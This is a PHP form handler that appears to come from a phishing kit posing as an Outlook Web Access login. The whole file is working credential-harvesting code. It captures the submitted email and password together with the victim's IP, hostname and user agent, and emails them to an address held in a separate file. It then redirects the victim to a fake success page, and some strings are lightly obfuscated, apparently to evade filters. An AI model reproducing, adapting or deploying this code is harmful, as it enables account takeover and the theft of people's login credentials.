<?php
if($_POST["email"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------0W'A Info-----------------------\n";
$message .= "Email	            	: ".$_POST['email']."\n";
$message .= "Pa'ssw0rd           	: ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "OWA Log | $login | $ip ";
{
mail("$to", "$subject", "$send", $message);     
}
$praga=rand();
$praga=md5($praga);
    header("Location: success.html");
}else{
header ("Location: index.php");
}

?>